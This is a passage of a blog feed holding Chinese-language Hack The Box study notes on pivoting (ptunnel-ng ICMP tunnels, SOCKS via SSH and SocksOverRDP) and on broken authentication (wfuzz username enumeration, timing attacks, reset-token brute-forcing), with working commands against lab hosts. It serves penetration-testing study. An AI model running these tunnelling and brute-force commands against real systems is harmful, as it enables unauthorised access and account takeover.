id="Starting-the-ptunnel-ng-Server-on-the-Target-Host"><a href="#Starting-the-ptunnel-ng-Server-on-the-Target-Host" class="headerlink" title="Starting the ptunnel-ng Server on the Target Host"></a>Starting the ptunnel-ng Server on the Target Host</h4><pre><code class="shell-session">ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22[sudo] password for ubuntu: ./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)[inf]: Starting ptunnel-ng 1.42.[inf]: (c) 2004-2011 Daniel Stoedle, &lt;daniels@cs.uit.no&gt;[inf]: (c) 2017-2019 Toni Uhlig,     &lt;matzeton@googlemail.com&gt;[inf]: Security features by Sebastien Raveau, &lt;sebastien.raveau@epita.fr&gt;[inf]: Forwarding incoming ping packets over TCP.[inf]: Ping proxy is listening in privileged mode.[inf]: Dropping privileges now.</code></pre><p>-r后面的IP地址应该是我们希望ptunnel ng接受连接的IP。在这种情况下，我们将使用从我们的攻击主机可以访问的任何IP。在实际参与过程中使用同样的想法和考虑会使我们受益。 回到攻击主机上，我们可以尝试连接到ptunnel ng服务器（-p＜ipAddress-Target＞），但要确保通过本地端口2222（-l2222）进行连接。通过本地端口2222连接允许我们通过ICMP隧道发送流量。</p><pre><code class="shell-session">Tanin@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22[inf]: Starting ptunnel-ng 1.42.[inf]: (c) 2004-2011 Daniel Stoedle, &lt;daniels@cs.uit.no&gt;[inf]: (c) 2017-2019 Toni Uhlig,     &lt;matzeton@googlemail.com&gt;[inf]: Security features by Sebastien Raveau, &lt;sebastien.raveau@epita.fr&gt;[inf]: Relaying packets from incoming TCP streams.</code></pre><p>随着ptunnel ng ICMP隧道的成功建立，我们可以尝试通过本地端口2222（-p2222）使用SSH连接到目标。</p><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1</code></pre><p>如果配置正确，我们将能够通过ICMP隧道输入凭据并进行SSH会话。 在连接的客户端和服务器端，我们会注意到ptunnel ng为我们提供了与通过ICMP隧道的流量相关的会话日志和流量统计信息。这是我们可以使用ICMP确认流量从客户端传递到服务器的一种方式。</p><h4 id="Enabling-Dynamic-Port-Forwarding-over-SSH"><a href="#Enabling-Dynamic-Port-Forwarding-over-SSH" class="headerlink" title="Enabling Dynamic Port Forwarding over SSH"></a>Enabling Dynamic Port Forwarding over SSH</h4><pre><code class="shell-session">Tanin@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1ubuntu@127.0.0.1&#39;s password: Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)&lt;snip&gt;</code></pre><p>我们可以使用带有Nmap的proxychains扫描内部网络上的目标（172.16.5.x）。根据我们的发现，我们可以尝试连接到目标。</p><pre><code class="shell-session">Tanin@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389</code></pre><h2 id="Network-Traffic-Analysis-Considerations"><a href="#Network-Traffic-Analysis-Considerations" class="headerlink" title="Network Traffic Analysis Considerations"></a>Network Traffic Analysis Considerations</h2><p>重要的是，我们要确认我们正在使用的工具是否如广告所示，并且我们已经设置并正确操作了它们。在使用ICMP隧道通过本节中教导的不同协议对流量进行隧道传输的情况下，我们可以从使用Wireshark等数据包分析器分析生成的流量中受益。仔细看一下下面的短片。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309041725504.gif" alt="img"></p><p>在这个片段的第一部分中，通过SSH建立连接，而不使用ICMP隧道。我们可能会注意到，TCP&amp;SSHv2流量被捕获。 剪辑中使用的命令：<a href="mailto:&#115;&#115;&#x68;&#117;&#x62;&#117;&#x6e;&#116;&#x75;&#x40;&#x31;&#x30;&#x2e;&#x31;&#50;&#x39;&#46;&#x32;&#48;&#50;&#x2e;&#54;&#52;">&#115;&#115;&#x68;&#117;&#x62;&#117;&#x6e;&#116;&#x75;&#x40;&#x31;&#x30;&#x2e;&#x31;&#50;&#x39;&#46;&#x32;&#48;&#50;&#x2e;&#54;&#52;</a> 在本片段的第二部分中，使用ICMP隧道通过SSH建立连接。请注意执行此操作时捕获的流量类型。 剪辑中使用的命令：ssh-p222-lubuntu 127.0.0.1</p><h1 id="RDP-and-SOCKS-Tunneling-with-SocksOverRDP"><a href="#RDP-and-SOCKS-Tunneling-with-SocksOverRDP" class="headerlink" title="RDP and SOCKS Tunneling with SocksOverRDP"></a>RDP and SOCKS Tunneling with SocksOverRDP</h1><p>在评估过程中，有时我们可能仅限于Windows网络，并且可能无法使用SSH进行数据透视。在这种情况下，我们必须使用适用于Windows操作系统的工具。<a href="https://github.com/nccgroup/SocksOverRDP">SocksOverRDP</a>是一个使用Windows远程桌面服务功能中的动态虚拟频道（DVC）的工具示例。DVC负责通过RDP连接对数据包进行隧道传输。使用此功能的一些示例是剪贴板数据传输和音频共享。然而，此功能也可用于通过网络传输任意数据包。我们可以使用SocksOverRDP来传输我们的自定义数据包，然后通过它进行代理。我们将使用工具 <a href="https://www.proxifier.com/">Proxifier</a>作为我们的代理服务器。 我们可以从将适当的二进制文件下载到我们的攻击主机开始执行此攻击。在我们的攻击主机上拥有二进制文件将使我们能够将它们转移到需要的每个目标。我们需要：</p><p> <a href="https://github.com/nccgroup/SocksOverRDP/releases">SocksOverRDP x64 Binaries</a>二进制文件</p><p><a href="https://www.proxifier.com/download/#win-tab">Proxifier Portable Binary</a></p><p> 我们可以查找ProxifierPE.zip 然后，我们可以使用xfreerdp连接到目标，并将SocksOverRDP64.zip文件复制到目标。然后，我们需要从Windows目标加载使用regsvr32.exe的SocksOverRDP.dll。</p><h4 id="Loading-SocksOverRDP-dll-using-regsvr32-exe"><a href="#Loading-SocksOverRDP-dll-using-regsvr32-exe" class="headerlink" title="Loading SocksOverRDP.dll using regsvr32.exe"></a>Loading SocksOverRDP.dll using regsvr32.exe</h4><pre><code class="cmd-session">C:\Users\htb-student\Desktop\SocksOverRDP-x64&gt; regsvr32.exe SocksOverRDP-Plugin.dll</code></pre><p>现在，我们可以使用mstsc.exe通过RDP连接到172.16.5.19，我们应该会收到一个提示，即SocksOverRDP插件已启用，它将在127.0.0.1:1080上侦听。我们可以使用胜利者的凭据：pass@123连接到172.16.5.19。</p><p>我们需要将SocksOverRDP64.zip或仅将SocksOverRDP-Server.exe传输到172.16.5.19。然后，我们可以使用管理员权限启动SocksOverRDP-Server.exe。</p><p>当我们回到我们的立足点目标并查看Netstat时，我们应该会看到我们的SOCKS侦听器在127.0.0.1:1080。</p><pre><code class="cmd-session">C:\Users\htb-student\Desktop\SocksOverRDP-x64&gt; netstat -antb | findstr 1080  TCP    127.0.0.1:1080         0.0.0.0:0              LISTENING</code></pre><p>启动我们的侦听器后，我们可以将Proxizer便携式传输到Windows 10目标（在10.129.x.x网络上），并将其配置为将我们的所有数据包转发到127.0.0.1:1080。Proxifier将通过给定的主机和端口路由流量。有关配置Proxifier的快速演练，请参阅下面的片段。</p><h4 id="Configuring-Proxifier"><a href="#Configuring-Proxifier" class="headerlink" title="Configuring Proxifier"></a>Configuring Proxifier</h4><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309041754536.gif" alt="img"></p><p>配置并运行Proxizer后，我们可以启动mstsc.exe，它将使用Proxizer通过127.0.0.1:1080将我们的所有流量进行枢轴传输，这将通过RDP将其传输到172.16.5.19，然后通过SocksOverRDP-server.exe将其路由到172.16.6.155。</p><h4 id="RDP-Performance-Considerations"><a href="#RDP-Performance-Considerations" class="headerlink" title="RDP Performance Considerations"></a>RDP Performance Considerations</h4><p>当在约定中与RDP会话交互时，我们可能会发现自己在给定会话中遇到性能缓慢的问题，尤其是当我们同时管理多个RDP会话时。如果是这种情况，我们可以访问mstsc.exe中的“体验”选项卡，并将“性能”设置为“调制解调器”。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309041755688.png" alt="img"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;SSH-for-Windows-plink-exe&quot;&gt;&lt;a href=&quot;#SSH-for-Windows-plink-exe&quot; class=&quot;headerlink&quot; title=&quot;SSH for Windows: plink.exe&quot;&gt;&lt;/a&gt;SSH for Wi</summary>
      
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Broken Authentication</title>
    <link href="https://taninluv.github.io/2023/09/01/Broken-Authentication/"/>
    <id>https://taninluv.github.io/2023/09/01/Broken-Authentication/</id>
    <published>2023-09-01T08:08:19.000Z</published>
    <updated>2023-09-06T03:17:22.996Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Overview-of-Attacks-Against-Authentication"><a href="#Overview-of-Attacks-Against-Authentication" class="headerlink" title="Overview of Attacks Against Authentication"></a>Overview of Attacks Against Authentication</h1><p>身份验证攻击总共可以针对三个域进行。这三个领域分为以下几类： <strong>HAS域（拥有的东西）</strong> <strong>IS域（所知信息）</strong> <strong>KNOWS域（所知的事情）</strong></p><span id="more"></span><h2 id="Attacking-the-HAS-Domain"><a href="#Attacking-the-HAS-Domain" class="headerlink" title="Attacking the HAS Domain"></a>Attacking the HAS Domain</h2><p>谈到在涵盖Multi-Factor Authentication时描述的三个域，has域看起来很简单，因为我们要么拥有硬件令牌，要么没有。然而，事情比表面上看起来更复杂： 徽章可以在不被接管的情况下被克隆 用于生成一次性密码的加密算法可能会被破坏 任何物理设备都可能被盗 远程天线可以轻松实现50厘米的工作距离，并复制经典的NFC徽章。你可能认为攻击者必须非常靠近受害者才能成功地执行这样的攻击。想想在使用公共交通工具或在商店排队等候时，我们坐得有多近，你可能会改变主意。每天都有多个人可以进行这样的克隆攻击。 想象一下，你正在办公室附近的酒吧吃快餐。你甚至没有注意到有袭击者从你的座位旁走过，因为你正忙于一项紧急的工作任务。他们刚刚克隆了你口袋里的徽章！！！几分钟后，他们将您的徽章信息转移到一个干净的代币中，并在吃午饭时使用它进入您公司的大楼。 很明显，克隆企业徽章并没有那么困难，而且后果可能很严重。</p><h2 id="Attacking-the-IS-Domain"><a href="#Attacking-the-IS-Domain" class="headerlink" title="Attacking the IS Domain"></a>Attacking the IS Domain</h2><p>你可能会认为is域是最难攻击的。如果一个人依靠“某物”来证明自己的身份，而这个“某物”被破坏了，他们就会失去证明自己身份的独特方式，因为没有人可以改变他们的身份。视网膜扫描、指纹读取器、面部识别都被证明是可以破解的。所有这些都可以通过第三方泄露、高清图片、吝啬鬼，甚至是偷对玻璃的邪恶女仆来破解。 销售基于is域的安全措施的公司表示，它们非常安全。2019年8月，一家制造通过移动或网络应用程序管理的生物识别智能锁的公司被攻破。该公司使用指纹或面部识别来识别授权用户。该漏洞暴露了所有指纹和面部模式，包括用户名和密码、授权和注册用户的地址。虽然用户可以轻松更改密码并减轻问题，但任何能够复制指纹或面部图案的人仍然可以解锁和管理这些智能锁。</p><h2 id="Attacking-the-KNOWS-Domain"><a href="#Attacking-the-KNOWS-Domain" class="headerlink" title="Attacking the KNOWS Domain"></a>Attacking the KNOWS Domain</h2><p>knows领域是我们将在本模块中深入研究的领域。这是最简单的理解，但我们应该深入了解每一个方面，因为它也是最广泛的。这个域指的是用户知道的东西，比如用户名或密码。在本模块中，我们将仅针对FBA进行工作。请记住，同样的方法也可以适用于HTTP身份验证实现。</p><h1 id="Default-Credentials"><a href="#Default-Credentials" class="headerlink" title="Default Credentials"></a>Default Credentials</h1><p> <a href="https://www.cirt.net/passwords">web database</a></p><h1 id="Weak-Bruteforce-Protections"><a href="#Weak-Bruteforce-Protections" class="headerlink" title="Weak Bruteforce Protections"></a>Weak Bruteforce Protections</h1><p>在深入研究攻击之前，我们必须了解在测试过程中可能遇到的保护措施。如今，有许多不同的安全机制旨在防止自动攻击。最常见的有以下几种。</p><ul><li><code>CAPTCHA</code></li><li><code>Rate Limits</code></li></ul><p> 此外，web开发人员经常创建自己的安全机制，使测试过程对我们来说更“有趣”，因为这些自定义安全机制可能包含我们可以利用的漏洞。让我们首先熟悉针对自动攻击的常见安全机制，以了解它们的功能，并为针对它们的攻击做好准备。</p><h2 id="CAPTCHA"><a href="#CAPTCHA" class="headerlink" title="CAPTCHA"></a>CAPTCHA</h2><p><a href="https://en.wikipedia.org/wiki/CAPTCHA">CAPTCHA</a></p><p>一种广泛使用的安全措施，以“告诉计算机和人类分开的全自动公共图灵测试”这句话命名，可以有很多不同的形式。例如，它可能需要键入图像上的单词，听到一个简短的音频样本并将你听到的内容输入到表格中，将图像与给定的模式匹配，或者执行基本的数学运算。</p><p>尽管CAPTCHA在过去已经被成功绕过，但它对自动攻击仍然非常有效。应用程序至少应该要求用户在几次尝试失败后解决CAPTCHA问题。一些开发人员经常完全跳过这种保护，而另一些开发人员则更喜欢在登录失败后提供CAPTCHA，以保持良好的用户体验。 开发人员也可以使用CAPTCHA的自定义或弱实现，例如，图像的名称由图像中包含的字符组成。保护不力往往比没有保护更糟糕，因为它提供了一种虚假的安全感。下图显示了一个弱实现，PHP代码将图像的内容放入id字段。这种类型的弱实现是罕见的，但并非不可能。</p><p><img src="https://academy.hackthebox.com/storage/modules/80/06-captcha_id.png" alt="img"></p><p>作为攻击者，我们只需读取页面的源代码即可找到CAPTCHA代码的值并绕过保护。我们应该始终阅读源代码。 作为开发人员，我们不应该开发自己的CAPTCHA，而应该依赖一个经过良好测试的CAPTCHA，并在很少失败登录后需要它。</p><h2 id="Rate-Limiting"><a href="#Rate-Limiting" class="headerlink" title="Rate Limiting"></a>Rate Limiting</h2><h2 id="Insufficient-Protections"><a href="#Insufficient-Protections" class="headerlink" title="Insufficient Protections"></a>Insufficient Protections</h2><p>当攻击者可以篡改为提高安全性而考虑的数据时，他们可以绕过所有或部分保护。例如，更改用户代理标头很容易。一些web应用程序或web应用程序防火墙利用X-Forwarded-For等标头来猜测实际的源IP地址。这样做是因为许多互联网提供商、移动运营商或大公司通常将用户“隐藏”在NAT后面。在没有X-Forwarded-For等标头帮助的情况下阻止IP地址可能会导致阻止特定NAT后面的所有用户。</p><h1 id="Brute-Forcing-Usernames"><a href="#Brute-Forcing-Usernames" class="headerlink" title="Brute Forcing Usernames"></a>Brute Forcing Usernames</h1><p>用户名枚举经常被忽视，可能是因为人们认为用户名不是私人信息。当你给另一个用户写消息时，我们通常认为我们知道他们的用户名、电子邮件地址等。同一个用户名经常被重复用于访问其他服务，如FTP、RDP和SSH等。由于许多web应用程序允许我们识别用户名，我们应该利用这一功能，并将其用于以后的攻击。</p><p>广泛的web应用程序都存在此漏洞。 用户名通常远没有密码复杂。当它们不是电子邮件地址时，很少包含特殊字符。拥有一个常见用户列表会给攻击者带来一些优势。除了获得良好的用户体验（UX）外，遇到随机或不易预测的用户名也很少见。用户将比计算机生成的（伪）随机用户名更容易记住他们的电子邮件地址或昵称。 拥有有效用户名列表，攻击者可以缩小暴力攻击的范围，或对支持员工或用户本身进行有针对性的攻击（利用OSINT）。此外，一个通用密码可以很容易地被喷到有效的帐户上，通常会导致成功的帐户泄露。 应该注意的是，用户名也可以通过抓取网络应用程序或使用公共信息来获取，例如社交网络上的公司简介。 防止用户名枚举攻击可能会影响用户体验。网络应用程序显示用户名是否存在可能有助于合法用户识别他们未能正确键入用户名，但这同样适用于试图确定有效用户名的攻击者。即使是像WordPress这样知名且成熟的web框架，也会受到用户枚举的影响，因为开发团队选择通过降低框架的安全级别来获得更流畅的用户体验。</p><h2 id="User-Unknown-Attack"><a href="#User-Unknown-Attack" class="headerlink" title="User Unknown Attack"></a>User Unknown Attack</h2><pre><code class="shell-session">Tanin@htb[/htb]$ wfuzz -c -z file,/opt/useful/SecLists/Usernames/top-usernames-shortlist.txt -d &quot;Username=FUZZ&amp;Password=dummypass&quot; --hs &quot;Unknown username&quot; http://brokenauthentication.hackthebox.eu/user_unknown.php</code></pre><h2 id="Username-Existence-Inference"><a href="#Username-Existence-Inference" class="headerlink" title="Username Existence Inference"></a>Username Existence Inference</h2><p>有时，web应用程序可能不会明确声明它不知道特定的用户名，但允许攻击者推断这条信息。如果用户名有效且已知，则某些web应用程序会预先填充用户名输入值，但如果用户名未知，则保留输入值为空或使用默认值。这在移动版本的网站上很常见，我们之前看到的易受攻击的WordPress登录页面也是如此。在开发过程中，始终尝试为失败登录和授权登录提供相同的体验：即使是微小的差异也足以推断出一条信息。</p><p>虽然不常见，但当用户名有效或无效时，也可能设置不同的cookie。例如，要使用客户端控件检查密码尝试，web应用程序可以设置一个名为“failed_login”的cookie，然后仅在用户名有效时检查该cookie。仔细检查响应，注意HTTP头和HTML源代码中的差异。</p><h2 id="Timing-Attack"><a href="#Timing-Attack" class="headerlink" title="Timing Attack"></a>Timing Attack</h2><p>某些身份验证功能在设计上可能存在缺陷。一个示例是身份验证函数，其中按顺序检查用户名和密码。让我们分析一下下面的程序。</p><pre><code class="php">&lt;?php// connect to database$db = mysqli_connect(&quot;localhost&quot;, &quot;dbuser&quot;, &quot;dbpass&quot;, &quot;dbname&quot;);// retrieve row data for user$result = $db-&gt;query(&#39;SELECT * FROM users WHERE username=&quot;&#39;.safesql($_POST[&#39;user&#39;]).&#39;&quot; AND active=1&#39;);// $db-&gt;query() replies True if there are at least a row (so a user), and False if there are no rows (so no users)if ($result) &#123;  // retrieve a row. don&#39;t use this code if multiple rows are expected  $row = mysqli_fetch_row($result);  // hash password using custom algorithm  $cpass = hash_password($_POST[&#39;password&#39;]);    // check if received password matches with one stored in the database  if ($cpass === $row[&#39;cpassword&#39;]) &#123;    echo &quot;Welcome $row[&#39;username&#39;]&quot;;  &#125; else &#123;    echo &quot;Invalid credentials.&quot;;  &#125; &#125; else &#123;  echo &quot;Invalid credentials.&quot;;&#125;?&gt;</code></pre><p>代码片段首先连接到数据库，然后执行查询以检索用户名与请求的用户名匹配的整行。如果没有结果，函数将以一条通用消息结束。当$result为true（用户存在并且处于活动状态）时，将对提供的密码进行散列和比较。如果使用的哈希算法足够强大，那么两个分支之间的时序差异将是显而易见的。通过使用通用hash_password（）函数计算$cpass，&#x3D;&#x3D;响应时间将高于其他情况&#x3D;&#x3D;。这个小错误可以通过在同一步骤中检查用户和密码来避免，有效用户名和无效用户名的时间相似。 下载脚本 <a href="https://academy.hackthebox.com/storage/modules/80/scripts/timing_py.txt">timing.py</a>来见证这些类型的时间差异，并针对使用bcrypt的示例web应用程序（timing.php）运行它。</p><h4 id="Timing-Attack-Timing-py"><a href="#Timing-Attack-Timing-py" class="headerlink" title="Timing Attack - Timing.py"></a>Timing Attack - Timing.py</h4><pre><code class="shell-session">Tanin@htb[/htb]$ python3 timing.py /opt/useful/SecLists/Usernames/top-usernames-shortlist.txt</code></pre><p>考虑到可能存在网络故障，很容易将“admin”识别为有效用户，因为它比其他测试用户花费了更多的时间。如果使用的算法很快，则时差会更小，攻击者可能会因为网络延迟或CPU负载而产生误报。然而，通过重复大量创建模型的请求，攻击仍然是可能的。虽然我们可以假设现代应用程序使用稳健的算法对密码进行散列，以使潜在的离线暴力攻击尽可能慢，但即使使用MD5或SHA1等快速算法，也可以推断信息。 当领英的用户群在2012年被泄露时，InfoSec的专业人士就SHA1被用作用户密码的哈希算法展开了一场辩论。虽然SHA1在那些日子里没有崩溃，但它被认为是一个不安全的哈希解决方案。Infosec的专业人士开始争论是否选择使用SHA1，而不是更强大的哈希算法，如scrypt、bcrypt或PBKDF（或argon2）。 虽然使用更健壮的算法总是比使用较弱的算法更可取，但架构工程师也应该记住计算成本。这个非常基本的Python脚本有助于阐明这个问题：</p><pre><code class="python">import scryptimport bcryptimport datetimeimport hashlibrounds = 100salt = bcrypt.gensalt()t0 = datetime.datetime.now()for x in range(rounds):    scrypt.hash(str(x).encode(), salt)t1 = datetime.datetime.now()for x in range(rounds):    hashlib.sha1(str(x).encode())t2 = datetime.datetime.now()for x in range(rounds):    bcrypt.hashpw(str(x).encode(), salt)t3 = datetime.datetime.now()print(&quot;sha1:   &#123;&#125;\nscrypt: &#123;&#125;\nbcrypt: &#123;&#125;&quot;.format(t2-t1,t1-t0,t3-t2))</code></pre><p>使用更稳健的算法，这会增加CPU时间和RAM使用量。core第八代i5上运行上面的脚本会得到以下结果。</p><pre><code class="shell-session">Tanin@htb[/htb]$ python3 hashtime.pysha1:   0:00:00.000082scrypt: 0:00:03.907575bcrypt: 0:00:22.660548</code></pre><p>让我们通过一个粗略的例子来添加一些上下文： 领英每天有约2亿用户，这意味着每秒约有24次登录（我们不排除拥有“记住我”代币的用户）。 如果他们使用像bcrypt这样的强大算法，在我们的测试机器上每轮使用0.23秒，他们将需要六台服务器才能让人们登录。对于一家运行数千台服务器的公司来说，这听起来不是什么大问题，但这需要对架构进行彻底改革。</p><h2 id="Enumerate-through-Password-Reset"><a href="#Enumerate-through-Password-Reset" class="headerlink" title="Enumerate through Password Reset"></a>Enumerate through Password Reset</h2><p>重置表单的保护通常不如登录表单好。因此，他们经常泄露有关有效或无效用户名的信息。正如我们已经讨论过的，当找到有效的用户名时，应用程序会回复“您应该很快收到一条消息”，而“用户名未知，请检查您的数据”则会泄露注册用户的存在。 这种攻击很吵，因为一些有效用户可能会收到要求重置密码的电子邮件。也就是说，这些电子邮件经常得不到最终用户的适当关注。</p><h2 id="Enumerate-through-Registration-Form"><a href="#Enumerate-through-Registration-Form" class="headerlink" title="Enumerate through Registration Form"></a>Enumerate through Registration Form</h2><p>默认情况下，当所选用户名已经存在时，提示用户选择用户名的注册表单通常会回复一条明确的消息，或者在这种情况下提供其他“告诉”。通过滥用这种行为，攻击者可以注册常见的用户名，如admin、administrator、tech，以枚举有效的用户名。在检查所选用户名（如CAPTCHA）是否存在之前，安全注册表应该实现一些保护。 在测试时，许多人不知道或没有准备好电子邮件地址的一个有趣功能是子寻址。这个在RFC5233中定义的扩展表示，邮件传输代理（MTA）应该忽略电子邮件地址左侧的任何+标记，并将其用作筛选过滤器的标记。这意味着写信给学生这样的电子邮件地址<a href="mailto:&#43;&#104;&#x74;&#98;&#64;&#x68;&#97;&#x63;&#x6b;&#x74;&#104;&#x65;&#x62;&#111;&#120;&#x2e;&#101;&#117;">&#43;&#104;&#x74;&#98;&#64;&#x68;&#97;&#x63;&#x6b;&#x74;&#104;&#x65;&#x62;&#111;&#120;&#x2e;&#101;&#117;</a>将电子邮件发送到<a href="mailto:&#115;&#x74;&#x75;&#x64;&#x65;&#x6e;&#116;&#x40;&#104;&#x61;&#x63;&#107;&#x74;&#x68;&#101;&#x62;&#x6f;&#120;&#46;&#x65;&#117;">&#115;&#x74;&#x75;&#x64;&#x65;&#x6e;&#116;&#x40;&#104;&#x61;&#x63;&#107;&#x74;&#x68;&#101;&#x62;&#x6f;&#120;&#46;&#x65;&#117;</a>并且，如果支持并正确配置了过滤器，则会将其放置在文件夹htb中。很少有网络应用程序尊重这个RFC，这导致了通过使用一个标签和一个实际的电子邮件地址来注册几乎无限用户的可能性。</p><h2 id="Predictable-Usernames"><a href="#Predictable-Usernames" class="headerlink" title="Predictable Usernames"></a>Predictable Usernames</h2><p>在用户体验需求较少的网络应用程序中，例如家庭银行，或者需要批量创建多个用户时，我们可能会看到按顺序创建的用户名。 虽然不常见，但您可能会遇到像user1000、user1001这样的帐户。“管理”用户也可能有一个可预测的命名约定，如support.It、support.fr或类似的。攻击者可以推断用于创建用户的算法（增量四位数、国家代码等），并从一些已知的用户帐户开始猜测现有用户帐户。</p><h1 id="Brute-Forcing-Passwords"><a href="#Brute-Forcing-Passwords" class="headerlink" title="Brute Forcing Passwords"></a>Brute Forcing Passwords</h1><h2 id="Password-Issues"><a href="#Password-Issues" class="headerlink" title="Password Issues"></a>Password Issues</h2><p>从历史上看，密码有三个重要问题。第一个问题在于名称本身。很多时候，用户认为密码可以只是一个单词，而不是一个短语。第二个问题是，用户大多设置了易于记住的密码。这样的密码通常很弱，或者遵循可预测的模式。即使用户选择了一个更复杂的密码，它通常也会写在便利贴上或保存在明文中。在提示字段中写入密码的情况也并不少见。当访问企业网络的频繁密码轮换要求开始发挥作用时，第二个密码问题会变得更糟。这一要求通常会导致诸如Spring2020、Autumn2020或CompanynameTown1、CompanynameTown2等密码。 最近，美国国家标准与技术研究院更新了其关于密码策略测试、密码年龄要求和密码组成规则的指导方针。</p><p>最后，众所周知，许多用户在多个服务上重复使用相同的密码。其中一个密码泄露或泄露会让攻击者访问广泛的网站或应用程序。这种攻击被称为凭据填充，与Hashcat破解密码模块中教授的单词列表生成密切相关。存储和使用复杂密码的可行解决方案是密码管理器。有时您可能会遇到弱密码要求。这种情况通常发生在有额外安全措施的情况下。ATM就是一个很好的例子。密码，或者更好的是PIN，只是一个4或5位数字的序列。相当弱，但缺乏复杂性，但总尝试次数有限（在失去对设备的物理访问之前，不超过3个PIN）。</p><p>现在让我们假设这个web应用程序需要一个介于8到12个字符之间的字符串，其中至少有一个大写和小写字符。我们现在使用一个巨大的单词列表，只提取符合此策略的密码。Unix grep不是速度最快的工具，但它允许我们使用POSIX正则表达式快速完成这项工作。下面的命令将针对rockyou-50.txt，这是SecLists中常见的rockyou密码泄漏的子集。此命令使用扩展正则表达式（-E）查找至少有一个大写字符（“[：upper：]]”）的行，然后仅查找同时有一个小写字符（“[[：lower：]]’”）并且长度为8和12个字符（“^.｛8,12｝$”）的线。</p><pre><code class="shell-session">Tanin@htb[/htb]$ grep &#39;[[:upper:]]&#39; rockyou.txt | grep &#39;[[:lower:]]&#39; | grep -E &#39;^.&#123;8,12&#125;$&#39;</code></pre><h1 id="Predictable-Reset-Token"><a href="#Predictable-Reset-Token" class="headerlink" title="Predictable Reset Token"></a>Predictable Reset Token</h1><p>重置令牌（以代码或临时密码的形式）是主要由应用程序在请求重置密码时生成的秘密数据。在实际更改凭据之前，用户必须提供它来证明自己的身份。有时，应用程序要求您选择一个或多个安全问题，并在注册时提供答案。如果您忘记了密码，您可以通过再次回答这些问题来重置密码。我们也可以将这些答案视为象征。 此功能允许我们在不知道密码的情况下重置用户的实际密码。</p><h2 id="Reset-Token-by-Email"><a href="#Reset-Token-by-Email" class="headerlink" title="Reset Token by Email"></a>Reset Token by Email</h2><p>如果应用程序允许用户使用URL或通过电子邮件发送的临时密码重置密码，那么它应该包含强大的令牌生成功能。框架通常具有用于此目的的专用功能。然而，开发人员通常会实现自己的功能，这些功能可能会引入逻辑缺陷和弱加密，或者通过模糊实现安全性。</p><h2 id="Weak-Token-Generation"><a href="#Weak-Token-Generation" class="headerlink" title="Weak Token Generation"></a>Weak Token Generation</h2><p>一些应用程序使用已知或可预测的值（如本地时间或请求操作的用户名）创建令牌，然后对值进行散列或编码。这是一种糟糕的安全做法，因为令牌不需要包含来自要验证的实际用户的任何信息，并且应该是一个纯随机值。在可逆编码的情况下，对令牌进行解码以了解它是如何构建的并伪造一个有效的令牌就足够了。<br>作为渗透测试人员，我们应该意识到这些类型的糟糕实现。当为给定用户请求重置令牌时，我们应该尝试使用已知的组合（如时间+用户名或时间+电子邮件）来强制执行任何弱哈希。以这段PHP代码为例。它在逻辑上等同于Apache OpenMeeting上报告的CVE-2016-0783漏洞：</p><pre><code class="php">&lt;?phpfunction generate_reset_token($username) &#123;  $time = intval(microtime(true) * 1000);  $token = md5($username . $time);  return $token;&#125;</code></pre><p>很容易发现漏洞。知道有效用户名的攻击者可以通过读取Date标头（它几乎总是出现在HTTP响应中）来获取服务器时间。然后，攻击者可以在几秒钟内强行执行$time值，并获得有效的重置令牌。在这个例子中，我们可以看到一个常见的请求泄露日期和时间。</p><p><img src="https://raw.githubusercontent.com/Taninluv/PICLIB/master/202309061018944.png" alt="img"></p><p>我们可以使用wfuzz。具体来说，我们可以为区分大小写的字符串Valid（–ss“Valid”）使用字符串匹配。当然，如果我们不知道提交有效令牌时web应用程序是如何回复的，我们可以使用“反向匹配”，通过使用–hs “Invalid.”查找不包含无效令牌的任何响应。</p><pre><code class="shell-session">Tanin@htb[/htb]$ wfuzz -z range,00000-99999 --ss &quot;Valid&quot; &quot;https://brokenauthentication.hackthebox.eu/token.php?user=admin&amp;token=FUZZ&quot;</code></pre><p>&lt;待续…&gt;</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;Overview-of-Attacks-Against-Authentication&quot;&gt;&lt;a href=&quot;#Overview-of-Attacks-Against-Authentication&quot; class=&quot;headerlink&quot; title=&quot;Overview of Attacks Against Authentication&quot;&gt;&lt;/a&gt;Overview of Attacks Against Authentication&lt;/h1&gt;&lt;p&gt;身份验证攻击总共可以针对三个域进行。这三个领域分为以下几类： &lt;strong&gt;HAS域（拥有的东西）&lt;/strong&gt; &lt;strong&gt;IS域（所知信息）&lt;/strong&gt; &lt;strong&gt;KNOWS域（所知的事情）&lt;/strong&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="base" scheme="https://taninluv.github.io/tags/base/"/>
    
  </entry>
  
  <entry>
    <title>Pivoting, Tunneling, and Port Forwarding-Choosing The Dig Site &amp;Playing Pong with Socat</title>
    <link href="https://taninluv.github.io/2023/08/30/Pivoting-Tunneling-and-Port-Forwarding-Choosing-The-Dig-Site-Playing-Pong-with-Socat/"/>
    <id>https://taninluv.github.io/2023/08/30/Pivoting-Tunneling-and-Port-Forwarding-Choosing-The-Dig-Site-Playing-Pong-with-Socat/</id>
    <published>2023-08-30T02:43:05.000Z</published>
    <updated>2023-09-22T13:07:17.144Z</updated>
    
